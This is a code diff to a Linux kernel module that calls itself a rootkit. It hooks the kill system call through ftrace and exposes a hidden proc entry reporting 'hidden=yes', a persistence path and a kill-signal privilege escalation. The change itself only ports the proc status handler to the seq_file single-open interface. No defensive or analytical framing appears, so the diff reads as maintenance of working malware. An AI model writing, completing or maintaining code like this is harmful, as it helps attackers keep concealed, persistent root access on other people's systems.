@@ -11,6 +11,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
@@ -137,18 +138,13 @@ static long hook_kill(const struct pt_regs *regs)
 
 // --- proc interface (hidden, accessible by direct path) ---
 
-static ssize_t status_read(struct file *f, char __user *buf,
-			   size_t count, loff_t *pos)
+static int status_read(struct seq_file *m, void *v)
 {
-	int len = snprintf(status_buf, sizeof(status_buf),
-			   "hidden=yes\npersistence=%s\nescalation=kill-%d\n",
-			   PERSIST_PATH, SIG_ESCALATE);
-	return simple_read_from_buffer(buf, count, pos, status_buf, len);
+	seq_printf(m, "hidden=yes\npersistence=%s\nescalation=kill-%d\n",
+		   PERSIST_PATH, SIG_ESCALATE);
+	return 0;
 }
 
-static const struct proc_ops status_proc_ops = {
-	.proc_read = status_read,
-};
 
 // --- ftrace helper ---
 
@@ -205,7 +201,7 @@ static int __init rootkit_init(void)
 	if (!gd_addr || !kill_addr)
 		return -ENOENT;
 
-	proc_entry = proc_create(HIDDEN_PROC, 0444, NULL, &status_proc_ops);
+	proc_entry = proc_create_single(HIDDEN_PROC, 0444, NULL, status_read);
 	if (!proc_entry)
 		return -ENOMEM;
 
